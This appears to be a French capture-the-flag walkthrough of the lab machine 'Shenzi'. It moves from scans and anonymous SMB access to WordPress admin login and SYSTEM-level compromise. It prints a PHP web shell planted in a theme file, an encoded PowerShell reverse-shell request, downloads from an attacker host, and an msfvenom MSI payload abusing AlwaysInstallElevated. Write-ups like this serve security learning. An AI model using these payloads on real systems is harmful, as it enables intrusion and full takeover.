  # Shenzi

	sudo masscan -p1-65535,U:1-65535 192.168.203.55 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.203.55 -oN nmap.txt
	feroxbuster --silent -u http://192.168.203.55
	
Scans classiques.

	PORT STATE SERVICE VERSION  
	21/tcp open ftp FileZilla ftpd 0.9.41 beta  
	80/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)  
	135/tcp open msrpc Microsoft Windows RPC  
	139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
	328/tcp filtered unknown  
	443/tcp open ssl/http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)  
	445/tcp open microsoft-ds?  
	3306/tcp open mysql?  
	5040/tcp open unknown  
	11554/tcp filtered unknown  
	14654/tcp filtered unknown  
	18016/tcp filtered unknown  
	19778/tcp filtered unknown  
	31943/tcp filtered unknown  
	36764/tcp filtered unknown  
	40430/tcp filtered unknown  
	48953/tcp filtered unknown  
	49237/tcp filtered unknown  
	49470/tcp filtered unknown  
	49664/tcp open msrpc Microsoft Windows RPC  
	49665/tcp open msrpc Microsoft Windows RPC  
	49666/tcp open msrpc Microsoft Windows RPC  
	49667/tcp open msrpc Microsoft Windows RPC  
	49668/tcp open msrpc Microsoft Windows RPC  
	49669/tcp open msrpc Microsoft Windows RPC  
	60863/tcp filtered unknown  
	64051/tcp filtered unknown

http://192.168.203.55/ => Vide
</br>http://192.168.203.55:443/ => Bad request

Un partage SMB est ouvert : 

	enum4linux 192.168.203.55
	smbclient -L //192.168.203.55 -N
	smbclient //192.168.203.55/Shenzi -N
	smb: \> mget *
	smb: \> exit
	cat *.txt

Il y a un fichier contenant des mots de passe qui mentionne WordPress. Et en effet sur http://192.168.203.55/shenzi/wp-admin on trouve un panel de connexion WordPress. 

En fouillant un peu, on voit que l'on peut modifier certaines pages sur http://192.168.203.55/shenzi/wp-admin/theme-editor.php et notamment la 404.

Je l'ai remplacée par une backdoor : 

	<?php
	        $cmd = ($_REQUEST['cmd']);
	        system($cmd);
	        die;
	?>

En visitant http://192.168.203.55/shenzi/404.php?cmd=whoami j'ai bien le résultat prévu. 

Exécution d'un reverse-shell : 

	curl http://192.168.203.55/shenzi/404.php?cmd=powershell%20-e%20JABjAGw...lACgAKQA%3D
	...
	rlwrap nc -nvlp 443
	...
	powershell -ep bypass
	whoami
	type C:\Users\Shenzi\Desktop\local.txt

	
### Élévation de privilèges : 

	iwr -Uri http://192.168.45.151/winpeas.exe -Outfile .\winpeas.exe
	./winpeas.exe > r.txt
	iwr -Uri http://192.168.45.151/PrivEscCheck.ps1 -Outfile .\PrivEscCheck.ps1
	Import-Module .\PrivEscCheck.ps1
	Invoke-PrivEscCheck -Extended

WinPEAS a trouvé quelque chose d'intéressant : 

> AlwaysInstallElevated set to 1 in HKLM!  
> AlwaysInstallElevated set to 1 in HKCU!

Voir : https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated

	msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.151 LPORT=443 -f msi-nouac > alwe.msi
	sudo cp ~/000_payloads/alwe.msi /var/www/html/
	==========
	iwr -Uri http://192.168.45.151/alwe.msi -Outfile ./alwe.msi
	./alwe.msi
	==========
	rlwrap nc -nvlp 443
	...
	whoami
	type C:\Users\Administrator\Desktop\proof.txt
